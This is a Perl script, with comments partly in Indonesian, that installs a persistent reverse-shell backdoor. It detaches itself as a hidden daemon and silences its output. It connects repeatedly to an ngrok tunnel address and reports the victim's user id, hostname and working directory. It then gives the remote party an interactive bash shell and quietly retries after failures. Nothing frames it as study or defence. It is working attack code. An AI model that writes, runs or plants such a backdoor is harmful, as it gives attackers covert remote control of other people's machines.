#!/usr/bin/perl
use strict;
use warnings;
use Socket;
use POSIX;

# ================= CONFIGURATION =================
my $SERVER = "0.tcp.ap.ngrok.io";
my $PORT   = 14249;
my $SHELL  = "/bin/bash";
# =================================================

# Daemonize process
fork() && exit;
setsid();
fork() && exit;
chdir "/";

# Close stdio
close($_) for (*STDIN, *STDOUT, *STDERR);
open(STDIN,  "</dev/null");
open(STDOUT, ">/dev/null");
open(STDERR, ">/dev/null");

# Main loop
while (1) {
    my $socket;
    
    eval {
        # Create socket
        socket($socket, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
        
        # Connect
        my $addr = inet_aton($SERVER) or die "Cannot resolve";
        my $port = sockaddr_in($PORT, $addr);
        
        connect($socket, $port) or die "Connect failed";
        
        # ============ LANGKAH 1: KIRIM PERINTAH PERTAMA ============
        # Kirim hasil 'id' command sebagai banner
        my $id_output = `id 2>&1`;
        my $pwd_output = `pwd 2>&1`;
        my $hostname = `hostname 2>&1`;
        
        print $socket "=== AUTO-EXECUTE ON CONNECT ===\n";
        print $socket "User: $id_output";
        print $socket "Host: $hostname";
        print $socket "PWD: $pwd_output";
        print $socket "===============================\n";
        print $socket "Type 'exit' to close, or continue with shell...\n\n";
        
        # ============ LANGKAH 2: SPAWN TTY SHELL ============
        # Fork untuk menangani shell
        my $pid = fork();
        
        if ($pid == 0) {
            # Child process: Setup TTY dan spawn shell
            # Duplicate socket ke stdio
            open(STDIN,  "<&", $socket);
            open(STDOUT, ">&", $socket);
            open(STDERR, ">&", $socket);
            
            # Setup terminal
            my $tty = POSIX::ttyname(fileno(STDIN));
            if ($tty) {
                # Jika kita punya TTY, set raw mode
                system("stty raw -echo");
            }
            
            # Spawn interactive shell
            exec($SHELL, "-i");
            exit(0);
        } else {
            # Parent process: Wait for shell to exit
            waitpid($pid, 0);
        }
        
        # Close socket
        close($socket);
    };
    
    # Jika ada error, tunggu dan coba lagi
    if ($@) {
        # Silent fail
        sleep(15 + int(rand(10)));
    }
}
